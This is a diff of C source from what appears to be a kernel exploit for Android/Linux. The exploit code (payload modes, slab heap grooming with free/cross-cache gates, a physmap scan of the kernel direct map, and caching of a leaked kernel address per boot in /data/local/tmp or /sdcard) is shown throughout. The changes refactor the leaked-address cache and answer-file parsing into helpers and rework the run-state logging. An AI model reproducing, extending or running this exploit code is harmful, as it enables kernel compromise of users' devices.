@@ -3,6 +3,7 @@
 #include "kernel_page.h"
 #include "kernel_page/gate.h"
 #include "kernel_page/run_state.h"
+#include "kernel_page/address_cache.h"
 #include <dirent.h>
 
 /* The emptying free must run on a CPU whose c->page is not base, or
@@ -171,137 +172,56 @@ static void mm_slot_probe(const char *tag, size_t i, long a0, long s0,
           "ds=%ld cls=%s\n", tag, i, s0, s1, a0, a1, da, ds, cls);
 }
 
-static char ks_cache_path[512];
-
 static int read_boot_id(char *buf, size_t len) {
-  FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
-  if (!f) return 0;
-  if (!fgets(buf, len, f)) {
-    fclose(f);
-    return 0;
-  }
-  fclose(f);
-  buf[strcspn(buf, "\r\n")] = 0;
-  return strlen(buf) >= 8;
+  return kp_boot_id_read(buf, len);
 }
 
-static int cache_path_usable(const char *path, int write) {
-  char parent[512];
-  char *slash;
-  size_t n;
-  if (!path || !*path || strlen(path) >= sizeof(parent)) return 0;
-  if (access(path, F_OK) == 0)
-    return access(path, write ? W_OK : R_OK) == 0;
-  n = strlen(path);
-  memcpy(parent, path, n + 1);
-  slash = strrchr(parent, '/');
-  if (!slash) return 0;
-  if (slash == parent) parent[1] = 0;
-  else *slash = 0;
-  return access(parent, write ? W_OK : R_OK) == 0;
-}
 
 static const char *select_ks_cache_path(int write) {
-  const char *env;
-  const char *dir;
-  char candidate[512];
-
-  env = getenv("KS_CACHE_PATH");
-  if (env && *env && cache_path_usable(env, write)) {
-    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", env);
-    return ks_cache_path;
-  }
-
-  dir = getenv("GHOSTLOCK_HOME");
-  if (dir && *dir) {
-    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
-    if (cache_path_usable(candidate, write)) {
-      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
-      return ks_cache_path;
-    }
-  }
-  dir = getenv("TMPDIR");
-  if (dir && *dir) {
-    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
-    if (cache_path_usable(candidate, write)) {
-      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
-      return ks_cache_path;
-    }
-  }
-  dir = getenv("HOME");
-  if (dir && *dir) {
-    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
-    if (cache_path_usable(candidate, write)) {
-      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
-      return ks_cache_path;
-    }
-  }
-  if (cache_path_usable("/sdcard/Download/ghostlock_ks_cache.txt", write)) {
-    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
-             "/sdcard/Download/ghostlock_ks_cache.txt");
-    return ks_cache_path;
-  }
-  if (cache_path_usable("/data/local/tmp/ks_cache.txt", write)) {
-    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
-             "/data/local/tmp/ks_cache.txt");
-    return ks_cache_path;
-  }
-  return NULL;
+  return kp_cache_select(write);
 }
 
 static size_t ks_cache_radius_bytes(void) {
-  const char *env = getenv("KS_CACHE_RADIUS_GB");
-  unsigned long long gb = env ? strtoull(env, NULL, 0) : 8;
-  if (!gb) gb = 8;
-  if (gb > 128) gb = 128;
-  return (size_t)gb << 30;
+  return kp_cache_radius_bytes();
 }
 
 static int ks_cache_load(uintptr_t *anchor, char *boot_id, size_t boot_len) {
   const char *path;
   FILE *f;
-  char line[128] = "";
-  char file_boot[128] = "";
-  unsigned long long value = 0;
-  int have_anchor = 0;
+  enum kp_cache_status st;
 
-  if (!read_boot_id(boot_id, boot_len)) return 0;
-  path = select_ks_cache_path(0);
+  if (!kp_boot_id_read(boot_id, boot_len)) return 0;
+  path = kp_cache_select(0);
   if (!path) return 0;
   f = fopen(path, "r");
   if (!f) return 0;
-  while (fgets(line, sizeof(line), f)) {
-    line[strcspn(line, "\r\n")] = 0;
-    if (!strncmp(line, "boot_id=", 8)) {
-      snprintf(file_boot, sizeof(file_boot), "%s", line + 8);
-      continue;
-    }
-    if (sscanf(line, "anchor_mm=0x%llx", &value) == 1 ||
-        sscanf(line, "anchor_mm=%llx", &value) == 1) {
-      have_anchor = 1;
-    }
-  }
+  st = kp_cache_parse(f, boot_id, (uintptr_t)g_direct_map_base,
+                      (uintptr_t)g_direct_map_end, anchor);
   fclose(f);
-  if (!have_anchor || value < g_direct_map_base || value >= g_direct_map_end) return 0;
-  if (strcmp(file_boot, boot_id) != 0) return 0;
-  *anchor = (uintptr_t)value;
-  return 1;
+  return st == KP_CACHE_OK;
 }
 
 static void ks_cache_save(uintptr_t anchor) {
   const char *path;
   char boot_id[128];
+  char text[256];
   FILE *f;
+  int n;
+
   if (anchor < g_direct_map_base || anchor >= g_direct_map_end) return;
-  if (!read_boot_id(boot_id, sizeof(boot_id))) return;
-  path = select_ks_cache_path(1);
+  if (!kp_boot_id_read(boot_id, sizeof(boot_id))) return;
+  path = kp_cache_select(1);
   if (!path) return;
+  n = kp_cache_format(text, sizeof(text), boot_id, anchor,
+                      (uintptr_t)g_direct_map_base,
+                      (uintptr_t)g_direct_map_end);
+  if (n <= 0) return;
   f = fopen(path, "w");
   if (!f) {
     pr_warning("KS_CACHE save failed path=%s\n", path);
     return;
   }
-  fprintf(f, "boot_id=%s\nanchor_mm=0x%016zx\n", boot_id, anchor);
+  fwrite(text, 1, (size_t)n, f);
   fclose(f);
   pr_info("KS_CACHE save path=%s anchor=%016zx\n", path, anchor);
 }
@@ -373,9 +293,12 @@ static void set_ks_window(uintptr_t anchor, int hit) {
     end = anchor + radius;
   ks->identity_start = start;
   ks->identity_end = end;
-  if (hit)
+  if (hit) {
+    const char *cache_path = kp_cache_select(0);
     pr_info("KS_CACHE hit path=%s anchor=%016zx start=%016zx end=%016zx radius=%zuGB\n",
-            ks_cache_path, anchor, start, end, radius >> 30);
+            cache_path != NULL ? cache_path : "?", anchor, start, end,
+            radius >> 30);
+  }
 }
 
 /* read RAM size from /proc/meminfo so the physmap scan never walks (and never
@@ -552,8 +475,10 @@ static void ks_export_collisions(const char *boot_id) {
 static int ks_pc_answer_read(uintptr_t *out) {
   FILE *f = fopen("/data/local/tmp/ks_mm_answer.txt", "r");
   unsigned char buf[64];
-  size_t n, i;
+  size_t n;
   uintptr_t mm = 0;
+  enum kp_answer_status st;
+
   if (!f) return 0;
   /* Strict wire format: the whole file must be exactly
    * "mm=0x" + 16 lowercase hex digits + LF (22 bytes), or the same
@@ -562,32 +487,29 @@ static int ks_pc_answer_read(uintptr_t *out) {
    * stale data) is rejected instead of parsed. */
   n = fread(buf, 1, sizeof(buf), f);
   fclose(f);
-  if (n != 22 && n != 23) {
-    if (n) pr_warning("KS_PC answer rejected len=%zu (expect 22 LF or 23 CRLF)\n", n);
-    return 0;
-  }
-  int eol_ok = n == 22 ? buf[21] == '\n'
-                       : (buf[21] == '\r' && buf[22] == '\n');
-  if (memcmp(buf, "mm=0x", 5) != 0 || !eol_ok) {
-    pr_warning("KS_PC answer rejected format\n");
-    return 0;
-  }
-  for (i = 5; i < n - 1; ++i) {
-    unsigned char c = buf[i];
-    unsigned v;
-    if (c >= '0' && c <= '9') v = c - '0';
-    else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
-    else {
+  st = kp_answer_parse((const char *)buf, n, (uintptr_t)g_direct_map_base,
+                       (uintptr_t)g_direct_map_end, (uintptr_t)P0_PAGE_OFFSET,
+                       (uint64_t)g_ram_bytes, &mm);
+  switch (st) {
+    case KP_ANSWER_OK:
+      *out = mm;
+      return 1;
+    case KP_ANSWER_LEN:
+      if (n) {
+        pr_warning("KS_PC answer rejected len=%zu (expect 22 LF or 23 CRLF)\n",
+                   n);
+      }
+      return 0;
+    case KP_ANSWER_FORMAT:
+      pr_warning("KS_PC answer rejected format\n");
+      return 0;
+    case KP_ANSWER_HEX:
       pr_warning("KS_PC answer rejected hex\n");
       return 0;
-    }
-    mm = (mm << 4) | v;
+    case KP_ANSWER_IMPLAUSIBLE:
+      pr_warning("KS_PC answer rejected mm=%016zx\n", mm);
+      return 0;
   }
-  if ((mm & 0x3f) == 0 && mm_plausible(mm)) {
-    *out = mm;
-    return 1;
-  }
-  pr_warning("KS_PC answer rejected mm=%016zx\n", mm);
   return 0;
 }
 
@@ -2276,11 +2198,12 @@ static void release_ctx_children(struct mm_ctx *ctx) {
 /* One line per preparation: the lifecycle the run actually recorded, and
  * whether the reported outcome is supported by it.  Printing only; no branch
  * above depends on the state machine. */
-static void ks_state_log(const kp_run *run, unsigned long long base) {
+static void ks_state_log(const kp_run *run, const char *cleanup,
+                         unsigned long long base) {
   pr_info("KS_STATE stage=%s outcome=%s samples=%u missing=%u report=%d "
-          "refusal=%s base=%016llx\n",
+          "cleanup=%s refusal=%s base=%016llx\n",
           kp_stage_name(run->stage), kp_outcome_name(run->outcome),
-          run->samples, run->missing, kp_run_report_ok(run),
+          run->samples, run->missing, kp_run_report_ok(run), cleanup,
           run->refusal != NULL ? run->refusal : "none", base);
 }
 
@@ -3715,11 +3638,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                 mm_min_partial_limit());
       }
       if (!target_freed_at_cross) {
+        (void)kp_run_refuse(&run, "no-crossing");
+        ks_state_log(&run, "skipped", (unsigned long long)base);
         pr_error("KS_DELIVERY skipped=1 reason=no-crossing base=%016zx\n",
                  (size_t)base);
-        (void)kp_run_refuse(&run, "no-crossing");
-        (void)kp_run_finish(&run);
-        ks_state_log(&run, (unsigned long long)base);
         if (post_f != NULL) {
           fclose(post_f);
           post_f = NULL;
@@ -3809,8 +3731,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kp_result_report((uintptr_t)base);
       if (targeted) {
         (void)kp_run_deliver(&run);
-        (void)kp_run_finish(&run);
-        ks_state_log(&run, (unsigned long long)base);
+        ks_state_log(&run, "pending", (unsigned long long)base);
       }
       if (!targeted) {
         /* The precondition visibly failed: the page at base is still part of
@@ -3828,10 +3749,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           fclose(post_f);
           post_f = NULL;
         }
-        pr_info("KS_TARGET_FREE waited_ms=%ld active=%ld->%ld num=%ld->%ld "
-                "slabs=%ld->%ld crossed_at=%d\n", free_wait_ms,
-                post_isolate_active, post_active, post_isolate_num, post_num,
-                post_isolate_slabs, post_slabs, crossed_at);
+        /* Three different windows, printed as three: the isolation sample,
+         * the gate baseline and the post-cleanup sample.  The old arrow
+         * compared the isolation value with the post-cleanup one and read as
+         * a single transition that never happened. */
+        pr_info("KS_TARGET_FREE waited_ms=%ld iso=%ld/%ld/%ld "
+                "gate=%ld/%ld/%ld post=%ld/%ld/%ld crossed_at=%d\n",
+                free_wait_ms, post_isolate_active, post_isolate_num,
+                post_isolate_slabs, cross_active, cross_num, cross_slabs,
+                post_active, post_num, post_slabs, crossed_at);
         pr_info("KS_TARGET_REASON base_page=gate-failed cpu=%d "
                 "crossed_at=%d\n", sched_getcpu(), crossed_at);
         pr_info("KS_EMPTY_FREE kind=target-exit cpu=%d->%d draining=%d "
@@ -3841,11 +3767,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         mm_slab_print("post-drain", post_active, post_num, post_slabs);
         pr_info("KS_DISCARD post active_objs=%ld num_objs=%ld slabdata=%ld\n",
                 post_active, post_num, post_slabs);
+        (void)kp_run_refuse(&run, "gate-preconditions");
+        ks_state_log(&run, "skipped", (unsigned long long)base);
         pr_error("KS_DELIVERY skipped=1 reason=gate-preconditions "
                  "base=%016zx\n", (size_t)base);
-        (void)kp_run_refuse(&run, "gate-preconditions");
-        (void)kp_run_finish(&run);
-        ks_state_log(&run, (unsigned long long)base);
         release_ctx_children(&lead_ctx);
         release_ctx_children(&post_ctx);
         if (trigger_fds != NULL) {
